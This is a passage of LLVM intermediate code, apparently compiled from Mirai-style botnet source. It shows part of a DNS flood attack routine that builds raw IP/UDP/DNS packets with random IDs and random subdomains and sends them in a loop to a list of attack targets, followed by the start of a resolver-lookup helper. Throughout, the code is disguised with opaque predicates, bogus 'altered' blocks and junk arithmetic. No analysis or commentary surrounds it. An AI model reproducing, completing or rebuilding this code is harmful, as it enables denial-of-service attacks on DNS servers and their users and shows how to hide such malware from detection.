  %447 = load i16, i16* %26, align 2
  %448 = zext i16 %447 to i32
  %449 = icmp eq i32 %448, 65535
  br i1 %449, label %450, label %456

; <label>:450:                                    ; preds = %446
  %451 = call i32 @rand_next()
  %452 = and i32 %451, 65535
  %453 = trunc i32 %452 to i16
  %454 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %455 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %454, i32 0, i32 0
  store i16 %453, i16* %455, align 2
  br label %456

; <label>:456:                                    ; preds = %450, %446
  %457 = load i16, i16* %27, align 2
  %458 = zext i16 %457 to i32
  %459 = icmp eq i32 %458, 65535
  br i1 %459, label %460, label %466

; <label>:460:                                    ; preds = %456
  %461 = call i32 @rand_next()
  %462 = and i32 %461, 65535
  %463 = trunc i32 %462 to i16
  %464 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %465 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %464, i32 0, i32 1
  store i16 %463, i16* %465, align 2
  br label %466

; <label>:466:                                    ; preds = %460, %456
  %467 = load i16, i16* %28, align 2
  %468 = zext i16 %467 to i32
  %469 = icmp eq i32 %468, 65535
  br i1 %469, label %470, label %476

; <label>:470:                                    ; preds = %466
  %471 = call i32 @rand_next()
  %472 = and i32 %471, 65535
  %473 = trunc i32 %472 to i16
  %474 = load %struct.dnshdr*, %struct.dnshdr** %46, align 8
  %475 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %474, i32 0, i32 0
  store i16 %473, i16* %475, align 2
  br label %476

; <label>:476:                                    ; preds = %470, %466
  %477 = load i8*, i8** %47, align 8
  %478 = load i8, i8* %29, align 1
  %479 = zext i8 %478 to i32
  call void @rand_alpha_str(i8* %477, i32 %479)
  %480 = load i8*, i8** %47, align 8
  %481 = load i8, i8* %29, align 1
  %482 = zext i8 %481 to i64
  %483 = getelementptr inbounds i8, i8* %480, i64 %482
  store i8 0, i8* %483, align 1
  %484 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %485 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %484, i32 0, i32 7
  store i16 0, i16* %485, align 2
  %486 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %487 = bitcast %struct.iphdr* %486 to i16*
  %488 = call zeroext i16 @checksum_generic(i16* %487, i32 20)
  %489 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %490 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %489, i32 0, i32 7
  store i16 %488, i16* %490, align 2
  %491 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %492 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %491, i32 0, i32 3
  store i16 0, i16* %492, align 2
  %493 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %494 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %495 = bitcast %struct.udphdr* %494 to i8*
  %496 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %497 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %496, i32 0, i32 2
  %498 = load i16, i16* %497, align 2
  %499 = load i8, i8* %29, align 1
  %500 = zext i8 %499 to i64
  %501 = add i64 21, %500
  %502 = add i64 %501, 2
  %503 = load i32, i32* %31, align 4
  %504 = sext i32 %503 to i64
  %505 = add i64 %502, %504
  %506 = add i64 %505, 4
  %507 = trunc i64 %506 to i32
  %508 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %493, i8* %495, i16 zeroext %498, i32 %507)
  %509 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %510 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %509, i32 0, i32 3
  store i16 %508, i16* %510, align 2
  %511 = load i32, i32* %32, align 4
  %512 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %513 = load i32, i32* %19, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %512, i64 %514
  %516 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %515, i32 0, i32 0
  %517 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %516, i32 0, i32 2
  %518 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %517, i32 0, i32 0
  store i32 %511, i32* %518, align 4
  %519 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %520 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %519, i32 0, i32 1
  %521 = load i16, i16* %520, align 2
  %522 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %523 = load i32, i32* %19, align 4
  %524 = sext i32 %523 to i64
  %525 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %522, i64 %524
  %526 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %525, i32 0, i32 0
  %527 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %526, i32 0, i32 1
  store i16 %521, i16* %527, align 2
  %528 = load i32, i32* %20, align 4
  %529 = load i8*, i8** %43, align 8
  %530 = load i8, i8* %29, align 1
  %531 = zext i8 %530 to i64
  %532 = add i64 41, %531
  %533 = add i64 %532, 2
  %534 = load i32, i32* %31, align 4
  %535 = sext i32 %534 to i64
  %536 = add i64 %533, %535
  %537 = add i64 %536, 4
  %538 = bitcast %union.__CONST_SOCKADDR_ARG* %48 to %struct.sockaddr**
  %539 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %540 = load i32, i32* %19, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %539, i64 %541
  %543 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %542, i32 0, i32 0
  %544 = bitcast %struct.sockaddr_in* %543 to %struct.sockaddr*
  store %struct.sockaddr* %544, %struct.sockaddr** %538, align 8
  %545 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %48, i32 0, i32 0
  %546 = load %struct.sockaddr*, %struct.sockaddr** %545, align 8
  %547 = call i64 @sendto(i32 %528, i8* %529, i64 %537, i32 16384, %struct.sockaddr* %546, i32 16)
  br label %548

; <label>:548:                                    ; preds = %476
  %549 = load i32, i32* %19, align 4
  %550 = add nsw i32 %549, 1
  store i32 %550, i32* %19, align 4
  br label %398

; <label>:551:                                    ; preds = %398
  %552 = load i32, i32* @x.29
  %553 = load i32, i32* @y.30
  %554 = sub i32 %552, 1
  %555 = mul i32 %552, %554
  %556 = urem i32 %555, 2
  %557 = icmp eq i32 %556, 0
  %558 = icmp slt i32 %553, 10
  %559 = or i1 %557, %558
  br i1 %559, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %551
  %560 = call i64 @time(i64* null) #6
  %561 = load i32, i32* %33, align 4
  %562 = sext i32 %561 to i64
  %563 = icmp sgt i64 %560, %562
  %564 = load i32, i32* @x.29
  %565 = load i32, i32* @y.30
  %566 = sub i32 %564, 1
  %567 = mul i32 %564, %566
  %568 = urem i32 %567, 2
  %569 = icmp eq i32 %568, 0
  %570 = icmp slt i32 %565, 10
  %571 = or i1 %569, %570
  br i1 %571, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %563, label %572, label %589

; <label>:572:                                    ; preds = %originalBBpart2136
  %573 = load i32, i32* @x.29
  %574 = load i32, i32* @y.30
  %575 = sub i32 %573, 1
  %576 = mul i32 %573, %575
  %577 = urem i32 %576, 2
  %578 = icmp eq i32 %577, 0
  %579 = icmp slt i32 %574, 10
  %580 = or i1 %578, %579
  br i1 %580, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %572
  %581 = load i32, i32* @x.29
  %582 = load i32, i32* @y.30
  %583 = sub i32 %581, 1
  %584 = mul i32 %581, %583
  %585 = urem i32 %584, 2
  %586 = icmp eq i32 %585, 0
  %587 = icmp slt i32 %582, 10
  %588 = or i1 %586, %587
  br i1 %588, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %606

; <label>:589:                                    ; preds = %originalBBpart2136
  %590 = load i32, i32* @x.29
  %591 = load i32, i32* @y.30
  %592 = sub i32 %590, 1
  %593 = mul i32 %590, %592
  %594 = urem i32 %593, 2
  %595 = icmp eq i32 %594, 0
  %596 = icmp slt i32 %591, 10
  %597 = or i1 %595, %596
  br i1 %597, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %589
  %598 = load i32, i32* @x.29
  %599 = load i32, i32* @y.30
  %600 = sub i32 %598, 1
  %601 = mul i32 %598, %600
  %602 = urem i32 %601, 2
  %603 = icmp eq i32 %602, 0
  %604 = icmp slt i32 %599, 10
  %605 = or i1 %603, %604
  br i1 %605, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br label %397

; <label>:606:                                    ; preds = %originalBBpart2140, %148, %142, %originalBBpart28
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %607 = alloca i32, align 4
  %608 = alloca i8, align 1
  %609 = alloca %struct.attack_target*, align 8
  %610 = alloca i8, align 1
  %611 = alloca %struct.attack_option*, align 8
  %612 = alloca i32, align 4
  %613 = alloca i32, align 4
  %614 = alloca i8**, align 8
  %615 = alloca i8, align 1
  %616 = alloca i16, align 2
  %617 = alloca i8, align 1
  %618 = alloca i8, align 1
  %619 = alloca i16, align 2
  %620 = alloca i16, align 2
  %621 = alloca i16, align 2
  %622 = alloca i8, align 1
  %623 = alloca i8*, align 8
  %624 = alloca i32, align 4
  %625 = alloca i32, align 4
  %626 = alloca i32, align 4
  %627 = alloca i32, align 4
  %628 = alloca i8, align 1
  %629 = alloca i8, align 1
  %630 = alloca %struct.iphdr*, align 8
  %631 = alloca %struct.udphdr*, align 8
  %632 = alloca %struct.dnshdr*, align 8
  %633 = alloca i8*, align 8
  %634 = alloca i8*, align 8
  %635 = alloca %struct.grehdr*, align 8
  %636 = alloca i8*, align 8
  %637 = alloca %struct.iphdr*, align 8
  %638 = alloca %struct.udphdr*, align 8
  %639 = alloca %struct.dnshdr*, align 8
  %640 = alloca i8*, align 8
  %641 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %607, align 4
  store i8 %1, i8* %608, align 1
  store %struct.attack_target* %2, %struct.attack_target** %609, align 8
  store i8 %3, i8* %610, align 1
  store %struct.attack_option* %4, %struct.attack_option** %611, align 8
  store i32 0, i32* %612, align 4
  store i32 0, i32* %613, align 4
  %642 = load i8, i8* %608, align 1
  %643 = zext i8 %642 to i64
  %644 = call noalias i8* @calloc(i64 %643, i64 8) #6
  %645 = bitcast i8* %644 to i8**
  store i8** %645, i8*** %614, align 8
  %646 = load i8, i8* %610, align 1
  %647 = load %struct.attack_option*, %struct.attack_option** %611, align 8
  %648 = call i32 @attack_get_opt_int(i8 zeroext %646, %struct.attack_option* %647, i8 zeroext 2, i32 0)
  %649 = trunc i32 %648 to i8
  store i8 %649, i8* %615, align 1
  %650 = load i8, i8* %610, align 1
  %651 = load %struct.attack_option*, %struct.attack_option** %611, align 8
  %652 = call i32 @attack_get_opt_int(i8 zeroext %650, %struct.attack_option* %651, i8 zeroext 3, i32 65535)
  %653 = trunc i32 %652 to i16
  store i16 %653, i16* %616, align 2
  %654 = load i8, i8* %610, align 1
  %655 = load %struct.attack_option*, %struct.attack_option** %611, align 8
  %656 = call i32 @attack_get_opt_int(i8 zeroext %654, %struct.attack_option* %655, i8 zeroext 4, i32 64)
  %657 = trunc i32 %656 to i8
  store i8 %657, i8* %617, align 1
  %658 = load i8, i8* %610, align 1
  %659 = load %struct.attack_option*, %struct.attack_option** %611, align 8
  %660 = call i32 @attack_get_opt_int(i8 zeroext %658, %struct.attack_option* %659, i8 zeroext 5, i32 0)
  %661 = trunc i32 %660 to i8
  store i8 %661, i8* %618, align 1
  %662 = load i8, i8* %610, align 1
  %663 = load %struct.attack_option*, %struct.attack_option** %611, align 8
  %664 = call i32 @attack_get_opt_int(i8 zeroext %662, %struct.attack_option* %663, i8 zeroext 6, i32 65535)
  %665 = trunc i32 %664 to i16
  store i16 %665, i16* %619, align 2
  %666 = load i8, i8* %610, align 1
  %667 = load %struct.attack_option*, %struct.attack_option** %611, align 8
  %668 = call i32 @attack_get_opt_int(i8 zeroext %666, %struct.attack_option* %667, i8 zeroext 7, i32 53)
  %669 = trunc i32 %668 to i16
  store i16 %669, i16* %620, align 2
  %670 = load i8, i8* %610, align 1
  %671 = load %struct.attack_option*, %struct.attack_option** %611, align 8
  %672 = call i32 @attack_get_opt_int(i8 zeroext %670, %struct.attack_option* %671, i8 zeroext 9, i32 65535)
  %673 = trunc i32 %672 to i16
  store i16 %673, i16* %621, align 2
  %674 = load i8, i8* %610, align 1
  %675 = load %struct.attack_option*, %struct.attack_option** %611, align 8
  %676 = call i32 @attack_get_opt_int(i8 zeroext %674, %struct.attack_option* %675, i8 zeroext 0, i32 12)
  %677 = trunc i32 %676 to i8
  store i8 %677, i8* %622, align 1
  %678 = load i8, i8* %610, align 1
  %679 = load %struct.attack_option*, %struct.attack_option** %611, align 8
  %680 = call i8* @attack_get_opt_str(i8 zeroext %678, %struct.attack_option* %679, i8 zeroext 8, i8* null)
  store i8* %680, i8** %623, align 8
  store i32 0, i32* %624, align 4
  %681 = call i32 @get_dns_resolver()
  store i32 %681, i32* %625, align 4
  %682 = call i64 @time(i64* null) #6
  %683 = load i32, i32* %607, align 4
  %684 = sext i32 %683 to i64
  %_ = shl i64 %682, %684
  %_1 = sub i64 0, %682
  %gen = add i64 %_1, %684
  %_2 = sub i64 0, %682
  %gen3 = add i64 %_2, %684
  %_4 = sub i64 0, %682
  %gen5 = add i64 %_4, %684
  %685 = add nsw i64 %682, %684
  %686 = trunc i64 %685 to i32
  store i32 %686, i32* %626, align 4
  %687 = load i8*, i8** %623, align 8
  %688 = icmp eq i8* %687, null
  br label %originalBB

originalBB6alteredBB:                             ; preds = %originalBB6, %104
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %121
  %689 = load i8*, i8** %30, align 8
  %690 = call i32 @util_strlen(i8* %689)
  store i32 %690, i32* %31, align 4
  %691 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %691, i32* %20, align 4
  %692 = icmp eq i32 %691, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %157
  store i32 0, i32* %34, align 4
  store i8 0, i8* %35, align 1
  store i8 0, i8* %36, align 1
  %693 = call noalias i8* @calloc(i64 600, i64 1) #6
  %694 = load i8**, i8*** %21, align 8
  %695 = load i32, i32* %19, align 4
  %696 = sext i32 %695 to i64
  %697 = getelementptr inbounds i8*, i8** %694, i64 %696
  store i8* %693, i8** %697, align 8
  %698 = load i8**, i8*** %21, align 8
  %699 = load i32, i32* %19, align 4
  %700 = sext i32 %699 to i64
  %701 = getelementptr inbounds i8*, i8** %698, i64 %700
  %702 = load i8*, i8** %701, align 8
  %703 = bitcast i8* %702 to %struct.iphdr*
  store %struct.iphdr* %703, %struct.iphdr** %37, align 8
  %704 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %705 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %704, i64 1
  %706 = bitcast %struct.iphdr* %705 to %struct.udphdr*
  store %struct.udphdr* %706, %struct.udphdr** %38, align 8
  %707 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %708 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %707, i64 1
  %709 = bitcast %struct.udphdr* %708 to %struct.dnshdr*
  store %struct.dnshdr* %709, %struct.dnshdr** %39, align 8
  %710 = load %struct.dnshdr*, %struct.dnshdr** %39, align 8
  %711 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %710, i64 1
  %712 = bitcast %struct.dnshdr* %711 to i8*
  store i8* %712, i8** %40, align 8
  %713 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %714 = bitcast %struct.iphdr* %713 to i8*
  %715 = load i8, i8* %714, align 4
  %_15 = sub i8 %715, 15
  %gen16 = mul i8 %_15, 15
  %716 = and i8 %715, 15
  %_17 = sub i8 0, %716
  %gen18 = add i8 %_17, 64
  %_19 = shl i8 %716, 64
  %717 = or i8 %716, 64
  store i8 %717, i8* %714, align 4
  %718 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %719 = bitcast %struct.iphdr* %718 to i8*
  %720 = load i8, i8* %719, align 4
  %_20 = sub i8 %720, -16
  %gen21 = mul i8 %_20, -16
  %_22 = sub i8 0, %720
  %gen23 = add i8 %_22, -16
  %_24 = sub i8 0, %720
  %gen25 = add i8 %_24, -16
  %_26 = shl i8 %720, -16
  %_27 = sub i8 0, %720
  %gen28 = add i8 %_27, -16
  %_29 = sub i8 0, %720
  %gen30 = add i8 %_29, -16
  %721 = and i8 %720, -16
  %_31 = sub i8 %721, 5
  %gen32 = mul i8 %_31, 5
  %722 = or i8 %721, 5
  store i8 %722, i8* %719, align 4
  %723 = load i8, i8* %22, align 1
  %724 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %725 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %724, i32 0, i32 1
  store i8 %723, i8* %725, align 1
  %726 = load i8, i8* %29, align 1
  %727 = zext i8 %726 to i64
  %_33 = sub i64 41, %727
  %gen34 = mul i64 %_33, %727
  %_35 = shl i64 41, %727
  %_36 = sub i64 41, %727
  %gen37 = mul i64 %_36, %727
  %728 = add i64 41, %727
  %_38 = sub i64 0, %728
  %gen39 = add i64 %_38, 2
  %_40 = sub i64 0, %728
  %gen41 = add i64 %_40, 2
  %_42 = sub i64 0, %728
  %gen43 = add i64 %_42, 2
  %_44 = shl i64 %728, 2
  %_45 = shl i64 %728, 2
  %_46 = shl i64 %728, 2
  %729 = add i64 %728, 2
  %730 = load i32, i32* %31, align 4
  %731 = sext i32 %730 to i64
  %_47 = sub i64 0, %729
  %gen48 = add i64 %_47, %731
  %_49 = sub i64 0, %729
  %gen50 = add i64 %_49, %731
  %_51 = shl i64 %729, %731
  %_52 = sub i64 %729, %731
  %gen53 = mul i64 %_52, %731
  %_54 = sub i64 0, %729
  %gen55 = add i64 %_54, %731
  %_56 = shl i64 %729, %731
  %_57 = sub i64 0, %729
  %gen58 = add i64 %_57, %731
  %_59 = sub i64 0, %729
  %gen60 = add i64 %_59, %731
  %732 = add i64 %729, %731
  %_61 = sub i64 %732, 4
  %gen62 = mul i64 %_61, 4
  %_63 = sub i64 %732, 4
  %gen64 = mul i64 %_63, 4
  %_65 = sub i64 %732, 4
  %gen66 = mul i64 %_65, 4
  %_67 = shl i64 %732, 4
  %_68 = sub i64 0, %732
  %gen69 = add i64 %_68, 4
  %_70 = shl i64 %732, 4
  %_71 = sub i64 0, %732
  %gen72 = add i64 %_71, 4
  %_73 = shl i64 %732, 4
  %_74 = shl i64 %732, 4
  %733 = add i64 %732, 4
  %734 = trunc i64 %733 to i16
  %735 = call zeroext i16 @htons(i16 zeroext %734) #7
  %736 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %737 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %736, i32 0, i32 2
  store i16 %735, i16* %737, align 2
  %738 = load i16, i16* %23, align 2
  %739 = call zeroext i16 @htons(i16 zeroext %738) #7
  %740 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %741 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %740, i32 0, i32 3
  store i16 %739, i16* %741, align 4
  %742 = load i8, i8* %24, align 1
  %743 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %744 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %743, i32 0, i32 5
  store i8 %742, i8* %744, align 4
  %745 = load i8, i8* %25, align 1
  %746 = icmp ne i8 %745, 0
  br label %originalBB14

originalBB78alteredBB:                            ; preds = %originalBB78, %232
  %747 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %748 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %747, i32 0, i32 6
  store i8 17, i8* %748, align 1
  %749 = load i32, i32* @LOCAL_ADDR, align 4
  %750 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %751 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %750, i32 0, i32 8
  store i32 %749, i32* %751, align 4
  %752 = load i32, i32* %32, align 4
  %753 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %754 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %753, i32 0, i32 9
  store i32 %752, i32* %754, align 4
  %755 = load i16, i16* %26, align 2
  %756 = call zeroext i16 @htons(i16 zeroext %755) #7
  %757 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %758 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %757, i32 0, i32 0
  store i16 %756, i16* %758, align 2
  %759 = load i16, i16* %27, align 2
  %760 = call zeroext i16 @htons(i16 zeroext %759) #7
  %761 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %762 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %761, i32 0, i32 1
  store i16 %760, i16* %762, align 2
  %763 = load i8, i8* %29, align 1
  %764 = zext i8 %763 to i64
  %_79 = shl i64 21, %764
  %_80 = shl i64 21, %764
  %765 = add i64 21, %764
  %_81 = sub i64 0, %765
  %gen82 = add i64 %_81, 2
  %_83 = shl i64 %765, 2
  %_84 = sub i64 %765, 2
  %gen85 = mul i64 %_84, 2
  %766 = add i64 %765, 2
  %767 = load i32, i32* %31, align 4
  %768 = sext i32 %767 to i64
  %_86 = sub i64 %766, %768
  %gen87 = mul i64 %_86, %768
  %_88 = sub i64 0, %766
  %gen89 = add i64 %_88, %768
  %_90 = sub i64 %766, %768
  %gen91 = mul i64 %_90, %768
  %769 = add i64 %766, %768
  %_92 = sub i64 %769, 4
  %gen93 = mul i64 %_92, 4
  %_94 = sub i64 %769, 4
  %gen95 = mul i64 %_94, 4
  %_96 = sub i64 %769, 4
  %gen97 = mul i64 %_96, 4
  %770 = add i64 %769, 4
  %771 = trunc i64 %770 to i16
  %772 = call zeroext i16 @htons(i16 zeroext %771) #7
  %773 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %774 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %773, i32 0, i32 2
  store i16 %772, i16* %774, align 2
  %775 = load i16, i16* %28, align 2
  %776 = call zeroext i16 @htons(i16 zeroext %775) #7
  %777 = load %struct.dnshdr*, %struct.dnshdr** %39, align 8
  %778 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %777, i32 0, i32 0
  store i16 %776, i16* %778, align 2
  %779 = call zeroext i16 @htons(i16 zeroext 256) #7
  %780 = load %struct.dnshdr*, %struct.dnshdr** %39, align 8
  %781 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %780, i32 0, i32 1
  store i16 %779, i16* %781, align 2
  %782 = call zeroext i16 @htons(i16 zeroext 1) #7
  %783 = load %struct.dnshdr*, %struct.dnshdr** %39, align 8
  %784 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %783, i32 0, i32 2
  store i16 %782, i16* %784, align 2
  %785 = load i8, i8* %29, align 1
  %786 = load i8*, i8** %40, align 8
  %787 = getelementptr inbounds i8, i8* %786, i32 1
  store i8* %787, i8** %40, align 8
  store i8 %785, i8* %786, align 1
  %788 = load i8, i8* %29, align 1
  %789 = zext i8 %788 to i32
  %790 = load i8*, i8** %40, align 8
  %791 = sext i32 %789 to i64
  %792 = getelementptr inbounds i8, i8* %790, i64 %791
  store i8* %792, i8** %40, align 8
  %793 = load i8*, i8** %40, align 8
  store i8* %793, i8** %41, align 8
  %794 = load i8*, i8** %40, align 8
  %795 = getelementptr inbounds i8, i8* %794, i64 1
  %796 = load i8*, i8** %30, align 8
  %797 = load i32, i32* %31, align 4
  %_98 = sub i32 0, %797
  %gen99 = add i32 %_98, 1
  %_100 = shl i32 %797, 1
  %_101 = shl i32 %797, 1
  %_102 = sub i32 %797, 1
  %gen103 = mul i32 %_102, 1
  %_104 = shl i32 %797, 1
  %798 = add nsw i32 %797, 1
  call void @util_memcpy(i8* %795, i8* %796, i32 %798)
  store i32 0, i32* %34, align 4
  br label %originalBB78

originalBB108alteredBB:                           ; preds = %originalBB108, %305
  %799 = load i8*, i8** %30, align 8
  %800 = load i32, i32* %34, align 4
  %801 = sext i32 %800 to i64
  %802 = getelementptr inbounds i8, i8* %799, i64 %801
  %803 = load i8, i8* %802, align 1
  %804 = sext i8 %803 to i32
  %805 = icmp eq i32 %804, 46
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %329
  %806 = load i8, i8* %35, align 1
  %807 = load i8*, i8** %41, align 8
  store i8 %806, i8* %807, align 1
  store i8 0, i8* %35, align 1
  %808 = load i8, i8* %36, align 1
  %_113 = sub i8 %808, 1
  %gen114 = mul i8 %_113, 1
  %_115 = sub i8 0, %808
  %gen116 = add i8 %_115, 1
  %_117 = sub i8 0, %808
  %gen118 = add i8 %_117, 1
  %809 = add i8 %808, 1
  store i8 %809, i8* %36, align 1
  %810 = load i8*, i8** %40, align 8
  %811 = load i32, i32* %34, align 4
  %812 = sext i32 %811 to i64
  %813 = getelementptr inbounds i8, i8* %810, i64 %812
  %814 = getelementptr inbounds i8, i8* %813, i64 1
  store i8* %814, i8** %41, align 8
  br label %originalBB112

originalBB122alteredBB:                           ; preds = %originalBB122, %358
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %424
  %815 = call i32 @rand_next()
  %_127 = sub i32 %815, 65535
  %gen128 = mul i32 %_127, 65535
  %_129 = sub i32 0, %815
  %gen130 = add i32 %_129, 65535
  %816 = and i32 %815, 65535
  %817 = trunc i32 %816 to i16
  %818 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %819 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %818, i32 0, i32 3
  store i16 %817, i16* %819, align 4
  br label %originalBB126

originalBB134alteredBB:                           ; preds = %originalBB134, %551
  %820 = call i64 @time(i64* null) #6
  %821 = load i32, i32* %33, align 4
  %822 = sext i32 %821 to i64
  %823 = icmp sgt i64 %820, %822
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %572
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %589
  br label %originalBB142
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = load i32, i32* @x.31
  %2 = load i32, i32* @y.32
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [2048 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca [32 x i8], align 16
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  store i32 0, i32* %10, align 4
  call void @table_unlock_val(i8 zeroext 41)
  %19 = call i8* @table_retrieve_val(i32 41, i32* null)
  %20 = call i32 (i8*, i32, ...) @open(i8* %19, i32 0)
  store i32 %20, i32* %10, align 4
  call void @table_lock_val(i8 zeroext 41)
  %21 = load i32, i32* %10, align 4
  %22 = icmp sge i32 %21, 0
  %23 = load i32, i32* @x.31
  %24 = load i32, i32* @y.32
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %223

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = load i32, i32* @x.31
  %33 = load i32, i32* @y.32
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %40 = load i32, i32* %10, align 4
  %41 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %42 = call i64 @read(i32 %40, i8* %41, i64 2048)
  %43 = trunc i64 %42 to i32
  store i32 %43, i32* %11, align 4
  %44 = load i32, i32* %10, align 4
  %45 = call i32 @close(i32 %44)
  call void @table_unlock_val(i8 zeroext 42)
  %46 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %47 = load i32, i32* %11, align 4
  %48 = call i8* @table_retrieve_val(i32 42, i32* null)
  %49 = call i32 @util_stristr(i8* %46, i32 %47, i8* %48)
  store i32 %49, i32* %12, align 4
  call void @table_lock_val(i8 zeroext 42)
  %50 = load i32, i32* %12, align 4
  %51 = icmp ne i32 %50, -1
  %52 = load i32, i32* @x.31
  %53 = load i32, i32* @y.32
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %51, label %60, label %222

; <label>:60:                                     ; preds = %originalBBpart24
  %61 = load i32, i32* @x.31
  %62 = load i32, i32* @y.32
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
